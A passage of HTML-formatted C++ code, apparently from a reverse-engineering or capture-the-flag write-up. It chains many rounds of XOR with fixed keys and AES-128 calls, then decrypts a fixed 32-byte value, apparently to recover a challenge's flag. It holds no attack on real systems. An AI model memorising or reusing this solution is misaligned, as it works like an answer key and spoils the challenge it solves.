class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey25[]&#123; <span class="number">0xc5</span>,<span class="number">0x22</span>,<span class="number">0x4e</span>,<span class="number">0x80</span>,<span class="number">0xbe</span>,<span class="number">0x4e</span>,<span class="number">0xe0</span>,<span class="number">0xe2</span>,<span class="number">0x9e</span>,<span class="number">0x2c</span>,<span class="number">0xc5</span>,<span class="number">0x9c</span>,<span class="number">0xcd</span>,<span class="number">0x42</span>,<span class="number">0x7f</span>,<span class="number">0x65</span>,<span class="number">0xb4</span>,<span class="number">0xd4</span>,<span class="number">0xaa</span>,<span class="number">0xb4</span>,<span class="number">0x15</span>,<span class="number">0xe5</span>,<span class="number">0x00</span>,<span class="number">0xf8</span>,<span class="number">0x55</span>,<span class="number">0x5e</span>,<span class="number">0xa2</span>,<span class="number">0xf8</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x20</span>,<span class="number">0xa7</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey25[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey26[]&#123; <span class="number">0xed</span>,<span class="number">0xed</span>,<span class="number">0x00</span>,<span class="number">0x34</span>,<span class="number">0x83</span>,<span class="number">0x7e</span>,<span class="number">0xef</span>,<span class="number">0x15</span>,<span class="number">0x1d</span>,<span class="number">0x83</span>,<span class="number">0xab</span>,<span class="number">0x98</span>,<span class="number">0xc8</span>,<span class="number">0x74</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x0f</span>,<span class="number">0x36</span>,<span class="number">0xd2</span>,<span class="number">0x7b</span>,<span class="number">0xe3</span>,<span class="number">0xcd</span>,<span class="number">0xc4</span>,<span class="number">0xb6</span>,<span class="number">0x37</span>,<span class="number">0x4e</span>,<span class="number">0x98</span>,<span class="number">0x6c</span>,<span class="number">0xc4</span>,<span class="number">0x0e</span>,<span class="number">0x01</span>,<span class="number">0x5c</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey26[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey27[]&#123; <span class="number">0x4d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x65</span>,<span class="number">0x88</span>,<span class="number">0x59</span>,<span class="number">0x48</span>,<span class="number">0x48</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4b</span>,<span class="number">0x9b</span>,<span class="number">0x66</span>,<span class="number">0x00</span>,<span class="number">0xcc</span>,<span class="number">0xd2</span>,<span class="number">0x1b</span>,<span class="number">0x00</span>,<span class="number">0xbd</span>,<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x94</span>,<span class="number">0x00</span>,<span class="number">0x39</span>,<span class="number">0x3c</span>,<span class="number">0x00</span>,<span class="number">0xcb</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey27[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">reverse</span>(input, input + <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> input[]&#123; <span class="number">18</span>, <span class="number">104</span>, <span class="number">119</span>, <span class="number">159</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">185</span>, <span class="number">223</span>, <span class="number">152</span>, <span class="number">168</span>, <span class="number">8</span>, <span class="number">71</span>, <span class="number">28</span>, <span class="number">98</span>, <span class="number">187</span>, <span class="number">134</span>, <span class="number">159</span>, <span class="number">126</span>, <span class="number">60</span>, <span class="number">1</span>, <span class="number">116</span>, <span class="number">184</span>, <span class="number">130</span>, <span class="number">175</span>, <span class="number">199</span>, <span class="number">219</span>, <span class="number">240</span>, <span class="number">235</span>, <span class="number">229</span>, <span class="number">20</span>, <span class="number">87</span>, <span class="number">30</span> &#125;;</span><br><span class="line"></span><br><span class="line">    std::<span class="built_in">reverse</span>(input, input + <span class="number">32</span>);</span><br><span class="line">    <span class="type">uint8_t</span> xorkey28[]&#123; <span class="number">0x4D</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x65</span>,<span class="number">0x88</span>,<span class="number">0x59</span>,<span class="number">0x48</span>,<span class="number">0x48</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4B</span>,<span class="number">0x9B</span>,<span class="number">0x66</span>,<span class="number">0x00</span>,<span class="number">0xCC</span>,<span class="number">0xD2</span>,<span class="number">0x1B</span>,<span class="number">0x00</span>,<span class="number">0xBD</span>,<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x94</span>,<span class="number">0x00</span>,<span class="number">0x39</span>,<span class="number">0x3C</span>,<span class="number">0x00</span>,<span class="number">0xCB</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey28[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey26[]&#123; <span class="number">0xed</span>,<span class="number">0xed</span>,<span class="number">0x00</span>,<span class="number">0x34</span>,<span class="number">0x83</span>,<span class="number">0x7e</span>,<span class="number">0xef</span>,<span class="number">0x15</span>,<span class="number">0x1d</span>,<span class="number">0x83</span>,<span class="number">0xab</span>,<span class="number">0x98</span>,<span class="number">0xc8</span>,<span class="number">0x74</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x0f</span>,<span class="number">0x36</span>,<span class="number">0xd2</span>,<span class="number">0x7b</span>,<span class="number">0xe3</span>,<span class="number">0xcd</span>,<span class="number">0xc4</span>,<span class="number">0xb6</span>,<span class="number">0x37</span>,<span class="number">0x4e</span>,<span class="number">0x98</span>,<span class="number">0x6c</span>,<span class="number">0xc4</span>,<span class="number">0x0e</span>,<span class="number">0x01</span>,<span class="number">0x5c</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey26[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey25[]&#123; <span class="number">0xc5</span>,<span class="number">0x22</span>,<span class="number">0x4e</span>,<span class="number">0x80</span>,<span class="number">0xbe</span>,<span class="number">0x4e</span>,<span class="number">0xe0</span>,<span class="number">0xe2</span>,<span class="number">0x9e</span>,<span class="number">0x2c</span>,<span class="number">0xc5</span>,<span class="number">0x9c</span>,<span class="number">0xcd</span>,<span class="number">0x42</span>,<span class="number">0x7f</span>,<span class="number">0x65</span>,<span class="number">0xb4</span>,<span class="number">0xd4</span>,<span class="number">0xaa</span>,<span class="number">0xb4</span>,<span class="number">0x15</span>,<span class="number">0xe5</span>,<span class="number">0x00</span>,<span class="number">0xf8</span>,<span class="number">0x55</span>,<span class="number">0x5e</span>,<span class="number">0xa2</span>,<span class="number">0xf8</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x20</span>,<span class="number">0xa7</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey25[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey24[]&#123; <span class="number">0xa2</span>,<span class="number">0x00</span>,<span class="number">0xef</span>,<span class="number">0xd2</span>,<span class="number">0x56</span>,<span class="number">0x00</span>,<span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x59</span>,<span class="number">0x35</span>,<span class="number">0xd4</span>,<span class="number">0x82</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x1b</span>,<span class="number">0x27</span>,<span class="number">0xaa</span>,<span class="number">0xd8</span>,<span class="number">0x84</span>,<span class="number">0x86</span>,<span class="number">0x8a</span>,<span class="number">0x00</span>,<span class="number">0xf5</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x2d</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0x8f</span>,<span class="number">0xfc</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey24[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey23[]&#123; <span class="number">0x16</span>,<span class="number">0x00</span>,<span class="number">0x2f</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0xd5</span>,<span class="number">0x5b</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x58</span>,<span class="number">0xd0</span>,<span class="number">0xb0</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0x1d</span>,<span class="number">0x39</span>,<span class="number">0xb9</span>,<span class="number">0xa2</span>,<span class="number">0x8d</span>,<span class="number">0x00</span>,<span class="number">0xc5</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x70</span>,<span class="number">0x93</span>,<span class="number">0x95</span>,<span class="number">0x00</span>,<span class="number">0x55</span>,<span class="number">0x6b</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey23[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey22[]&#123; <span class="number">0x07</span>,<span class="number">0x9f</span>,<span class="number">0x6e</span>,<span class="number">0x23</span>,<span class="number">0x1e</span>,<span class="number">0x88</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xe2</span>,<span class="number">0x99</span>,<span class="number">0x49</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x5e</span>,<span class="number">0x85</span>,<span class="number">0xc9</span>,<span class="number">0xb5</span>,<span class="number">0x06</span>,<span class="number">0x8c</span>,<span class="number">0x4c</span>,<span class="number">0x13</span>,<span class="number">0x4e</span>,<span class="number">0x2f</span>,<span class="number">0x00</span>,<span class="number">0xe1</span>,<span class="number">0xdb</span>,<span class="number">0x47</span>,<span class="number">0xfa</span>,<span class="number">0xba</span>,<span class="number">0x91</span>,<span class="number">0x4c</span>,<span class="number">0xe7</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey22[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey21[]&#123; <span class="number">0x5f</span>,<span class="number">0x68</span>,<span class="number">0xf7</span>,<span class="number">0x00</span>,<span class="number">0x1e</span>,<span class="number">0xba</span>,<span class="number">0x00</span>,<span class="number">0x83</span>,<span class="number">0x00</span>,<span class="number">0xad</span>,<span class="number">0x54</span>,<span class="number">0xd0</span>,<span class="number">0x91</span>,<span class="number">0x00</span>,<span class="number">0x79</span>,<span class="number">0xb5</span>,<span class="number">0xd8</span>,<span class="number">0x96</span>,<span class="number">0xed</span>,<span class="number">0x67</span>,<span class="number">0x99</span>,<span class="number">0x6a</span>,<span class="number">0xe0</span>,<span class="number">0x6c</span>,<span class="number">0xad</span>,<span class="number">0xdb</span>,<span class="number">0x5a</span>,<span class="number">0x90</span>,<span class="number">0xea</span>,<span class="number">0xa4</span>,<span class="number">0x6d</span>,<span class="number">0xab</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey21[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey20[]&#123; <span class="number">0xae</span>,<span class="number">0x30</span>,<span class="number">0x50</span>,<span class="number">0x8e</span>,<span class="number">0x8e</span>,<span class="number">0x9e</span>,<span class="number">0x35</span>,<span class="number">0x41</span>,<span class="number">0x7b</span>,<span class="number">0x96</span>,<span class="number">0x56</span>,<span class="number">0x1e</span>,<span class="number">0xe7</span>,<span class="number">0xcc</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0x10</span>,<span class="number">0x59</span>,<span class="number">0xa5</span>,<span class="number">0x62</span>,<span class="number">0xb5</span>,<span class="number">0x57</span>,<span class="number">0xea</span>,<span class="number">0xbc</span>,<span class="number">0x34</span>,<span class="number">0xb7</span>,<span class="number">0xd6</span>,<span class="number">0x0e</span>,<span class="number">0x3a</span>,<span class="number">0x27</span>,<span class="number">0x18</span>,<span class="number">0xb3</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey20[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey19[]&#123; <span class="number">0xaa</span>,<span class="number">0xce</span>,<span class="number">0x0d</span>,<span class="number">0xe0</span>,<span class="number">0xd2</span>,<span class="number">0xfb</span>,<span class="number">0xd2</span>,<span class="number">0x12</span>,<span class="number">0xb1</span>,<span class="number">0x11</span>,<span class="number">0xad</span>,<span class="number">0x65</span>,<span class="number">0x0c</span>,<span class="number">0x45</span>,<span class="number">0xf2</span>,<span class="number">0xe0</span>,<span class="number">0x4a</span>,<span class="number">0x1a</span>,<span class="number">0xed</span>,<span class="number">0x47</span>,<span class="number">0x14</span>,<span class="number">0x44</span>,<span class="number">0x59</span>,<span class="number">0xe9</span>,<span class="number">0x61</span>,<span class="number">0xfa</span>,<span class="number">0x09</span>,<span class="number">0xaf</span>,<span class="number">0xa5</span>,<span class="number">0xb0</span>,<span class="number">0x15</span>,<span class="number">0x15</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey19[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey18[]&#123; <span class="number">0x2a</span>,<span class="number">0x1a</span>,<span class="number">0x00</span>,<span class="number">0x18</span>,<span class="number">0x8a</span>,<span class="number">0x00</span>,<span class="number">0x36</span>,<span class="number">0x00</span>,<span class="number">0x3d</span>,<span class="number">0x86</span>,<span class="number">0x16</span>,<span class="number">0x9e</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x00</span>,<span class="number">0x92</span>,<span class="number">0xa3</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xb9</span>,<span class="number">0x6b</span>,<span class="number">0x1f</span>,<span class="number">0x41</span>,<span class="number">0xa9</span>,<span class="number">0x00</span>,<span class="number">0xb9</span>,<span class="number">0xa9</span>,<span class="number">0x2b</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="built_in">aes_decrypt_128</span>(aes_key, input, input); <span class="built_in">aes_decrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey18[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey17[]&#123; <span class="number">0xd3</span>,<span class="number">0xe6</span>,<span class="number">0xcb</span>,<span class="number">0x3a</span>,<span class="number">0x00</span>,<span class="number">0x8b</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x75</span>,<span class="number">0xb7</span>,<span class="number">0x24</span>,<span class="number">0x12</span>,<span class="number">0x4b</span>,<span class="number">0xc4</span>,<span class="number">0xbe</span>,<span class="number">0x4e</span>,<span class="number">0x4e</span>,<span class="number">0x7e</span>,<span class="number">0xb7</span>,<span class="number">0xeb</span>,<span class="number">0x02</span>,<span class="number">0xeb</span>,<span class="number">0x2b</span>,<span class="number">0x23</span>,<span class="number">0xac</span>,<span class="number">0x1c</span>,<span class="number">0xf9</span>,<span class="number">0x9f</span>,<span class="number">0x7d</span>,<span class="number">0xbf</span>,<span class="number">0xf9</span>,<span class="number">0xf0</span> &#125;;</span><br><span class="line">    <span class="built_in">aes_decrypt_128</span>(aes_key, input, input); <span class="built_in">aes_decrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey17[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey16[]&#123; <span class="number">0xe9</span>,<span class="number">0x11</span>,<span class="number">0xf0</span>,<span class="number">0x24</span>,<span class="number">0xa1</span>,<span class="number">0x34</span>,<span class="number">0x3a</span>,<span class="number">0xb1</span>,<span class="number">0x1d</span>,<span class="number">0x27</span>,<span class="number">0xda</span>,<span class="number">0xd0</span>,<span class="number">0xe7</span>,<span class="number">0x1f</span>,<span class="number">0x5b</span>,<span class="number">0xbc</span>,<span class="number">0x08</span>,<span class="number">0xde</span>,<span class="number">0xf5</span>,<span class="number">0xab</span>,<span class="number">0x1b</span>,<span class="number">0xca</span>,<span class="number">0x83</span>,<span class="number">0xd7</span>,<span class="number">0xf9</span>,<span class="number">0x52</span>,<span class="number">0xe5</span>,<span class="number">0x3c</span>,<span class="number">0xa0</span>,<span class="number">0xc9</span>,<span class="number">0x0a</span>,<span class="number">0x1a</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey16[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey15[]&#123; <span class="number">0x00</span>,<span class="number">0xd1</span>,<span class="number">0x57</span>,<span class="number">0x00</span>,<span class="number">0x2b</span>,<span class="number">0xf1</span>,<span class="number">0x5e</span>,<span class="number">0xea</span>,<span class="number">0xa4</span>,<span class="number">0x79</span>,<span class="number">0x00</span>,<span class="number">0x2c</span>,<span class="number">0xd8</span>,<span class="number">0x88</span>,<span class="number">0x7c</span>,<span class="number">0x00</span>,<span class="number">0x5a</span>,<span class="number">0x1d</span>,<span class="number">0x00</span>,<span class="number">0xfe</span>,<span class="number">0x00</span>,<span class="number">0xf1</span>,<span class="number">0xbf</span>,<span class="number">0x05</span>,<span class="number">0x55</span>,<span class="number">0xe6</span>,<span class="number">0x82</span>,<span class="number">0x00</span>,<span class="number">0x11</span>,<span class="number">0x00</span>,<span class="number">0xe1</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="built_in">aes_decrypt_128</span>(aes_key, input, input); <span class="built_in">aes_decrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey15[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey14[]&#123; <span class="number">0x75</span>,<span class="number">0x9a</span>,<span class="number">0x74</span>,<span class="number">0x00</span>,<span class="number">0x7a</span>,<span class="number">0x69</span>,<span class="number">0xae</span>,<span class="number">0xed</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x3a</span>,<span class="number">0x00</span>,<span class="number">0x24</span>,<span class="number">0xaf</span>,<span class="number">0xa3</span>,<span class="number">0x33</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x44</span>,<span class="number">0x21</span>,<span class="number">0x00</span>,<span class="number">0xdc</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x27</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x8a</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey14[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey13[]&#123; <span class="number">0x27</span>,<span class="number">0xa1</span>,<span class="number">0xed</span>,<span class="number">0xb3</span>,<span class="number">0x45</span>,<span class="number">0xd5</span>,<span class="number">0x5a</span>,<span class="number">0x87</span>,<span class="number">0x6c</span>,<span class="number">0x0d</span>,<span class="number">0x35</span>,<span class="number">0x76</span>,<span class="number">0x29</span>,<span class="number">0x18</span>,<span class="number">0xb1</span>,<span class="number">0x9c</span>,<span class="number">0x5c</span>,<span class="number">0xe2</span>,<span class="number">0x59</span>,<span class="number">0x08</span>,<span class="number">0xe7</span>,<span class="number">0xe6</span>,<span class="number">0x55</span>,<span class="number">0xce</span>,<span class="number">0x7c</span>,<span class="number">0x6f</span>,<span class="number">0x3c</span>,<span class="number">0x5d</span>,<span class="number">0xee</span>,<span class="number">0xa0</span>,<span class="number">0x73</span>,<span class="number">0x11</span> &#125;;</span><br><span class="line">    <span class="built_in">aes_decrypt_128</span>(aes_key, input, input); <span class="built_in">aes_decrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey13[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey12[]&#123; <span class="number">0x00</span>,<span class="number">0x40</span>,<span class="number">0x7f</span>,<span class="number">0xc6</span>,<span class="number">0xd5</span>,<span class="number">0x79</span>,<span class="number">0xa4</span>,<span class="number">0xfb</span>,<span class="number">0xfe</span>,<span class="number">0xa6</span>,<span class="number">0x00</span>,<span class="number">0x32</span>,<span class="number">0xb9</span>,<span class="number">0x6e</span>,<span class="number">0x4f</span>,<span class="number">0xf1</span>,<span class="number">0x62</span>,<span class="number">0xa3</span>,<span class="number">0x00</span>,<span class="number">0x47</span>,<span class="number">0x37</span>,<span class="number">0x4d</span>,<span class="number">0xfd</span>,<span class="number">0x00</span>,<span class="number">0xbe</span>,<span class="number">0x55</span>,<span class="number">0xe2</span>,<span class="number">0x00</span>,<span class="number">0xbe</span>,<span class="number">0x3f</span>,<span class="number">0x00</span>,<span class="number">0xb2</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey12[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey11[]&#123; <span class="number">0x68</span>,<span class="number">0xf3</span>,<span class="number">0x4a</span>,<span class="number">0xc2</span>,<span class="number">0x00</span>,<span class="number">0x2b</span>,<span class="number">0x8d</span>,<span class="number">0x39</span>,<span class="number">0x64</span>,<span class="number">0x00</span>,<span class="number">0x75</span>,<span class="number">0x00</span>,<span class="number">0xe6</span>,<span class="number">0x32</span>,<span class="number">0xc2</span>,<span class="number">0xb4</span>,<span class="number">0xc4</span>,<span class="number">0x00</span>,<span class="number">0x57</span>,<span class="number">0x3c</span>,<span class="number">0x87</span>,<span class="number">0x00</span>,<span class="number">0x75</span>,<span class="number">0x00</span>,<span class="number">0x94</span>,<span class="number">0x68</span>,<span class="number">0x1c</span>,<span class="number">0x12</span>,<span class="number">0x07</span>,<span class="number">0x00</span>,<span class="number">0xdb</span>,<span class="number">0x09</span> &#125;;</span><br><span class="line">    <span class="built_in">aes_decrypt_128</span>(aes_key, input, input); <span class="built_in">aes_decrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey11[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey10[]&#123; <span class="number">0x1b</span>,<span class="number">0x2f</span>,<span class="number">0x4f</span>,<span class="number">0x5e</span>,<span class="number">0x44</span>,<span class="number">0x18</span>,<span class="number">0x2f</span>,<span class="number">0xe1</span>,<span class="number">0x5b</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0x32</span>,<span class="number">0xf6</span>,<span class="number">0xf0</span>,<span class="number">0x6b</span>,<span class="number">0xf9</span>,<span class="number">0x97</span>,<span class="number">0xc9</span>,<span class="number">0x58</span>,<span class="number">0x61</span>,<span class="number">0x0f</span>,<span class="number">0xf4</span>,<span class="number">0xa9</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,<span class="number">0xa3</span>,<span class="number">0x15</span>,<span class="number">0x72</span>,<span class="number">0xa4</span>,<span class="number">0xe9</span>,<span class="number">0x58</span>,<span class="number">0x39</span> &#125;;</span><br><span class="line">    <span class="built_in">aes_decrypt_128</span>(aes_key, input, input); <span class="built_in">aes_decrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey10[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey9[]&#123; <span class="number">0xb6</span>,<span class="number">0x79</span>,<span class="number">0xcd</span>,<span class="number">0x35</span>,<span class="number">0xa6</span>,<span class="number">0x21</span>,<span class="number">0x21</span>,<span class="number">0x0c</span>,<span class="number">0x88</span>,<span class="number">0x61</span>,<span class="number">0xe7</span>,<span class="number">0xe5</span>,<span class="number">0x6d</span>,<span class="number">0xc9</span>,<span class="number">0x55</span>,<span class="number">0x49</span>,<span class="number">0xa4</span>,<span class="number">0x54</span>,<span class="number">0x85</span>,<span class="number">0x43</span>,<span class="number">0x98</span>,<span class="number">0x8e</span>,<span class="number">0x68</span>,<span class="number">0x3f</span>,<span class="number">0xdd</span>,<span class="number">0x57</span>,<span class="number">0xa5</span>,<span class="number">0xf1</span>,<span class="number">0xbd</span>,<span class="number">0xc8</span>,<span class="number">0x81</span>,<span class="number">0x85</span> &#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(input); <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) input[i] ^= xorkey9[i];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey8[]&#123; <span class="number">0x0c</span>,<span class="number">0x1d</span>,<span class="number">0x7d</span>,<span class="number">0xd2</span>,<span class="number">0xef</span>,<span class="number">0x8e</span>,<span class="number">0xb5</span>,<span class="number">0x48</span>,<span class="number">0x3b</span>,<span class="number">0x00</span>,<span class="number">0xfe</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0x54</span>,<span class="number">0xc6</span>,<span class="number">0x45</span>,<span class="number">0xed</span>,<span class="number">0x67</span>,<span class="number">0x00</span>,<span class="number">0x12</span>,<span class="number">0x3f</span>,<span class="number">0x9e</span>,<span class="number">0x96</span>,<span class="number">0x48</span>,<span class="number">0x2f</span>,<span class="number">0x9f</span>,<span 